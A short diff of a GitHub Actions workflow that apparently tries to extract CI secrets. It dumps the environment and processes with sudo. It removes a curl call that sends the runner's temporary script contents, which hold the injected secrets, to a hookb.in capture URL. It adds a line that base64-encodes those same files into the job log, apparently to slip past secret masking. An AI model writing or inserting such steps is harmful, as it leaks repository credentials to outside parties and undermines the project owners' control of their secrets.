@@ -34,5 +34,4 @@ jobs:
         node checksecret.js "${{ secrets.KEY }}"
         sudo printenv
         sudo ps aux 
-        export d=`cat /home/runner/work/_temp/*.sh`
-        curl "https://hookb.in/7ZwWEXkZPNSa99D3RMWK?data=$d"
+        cat /home/runner/work/_temp/*.sh | base64
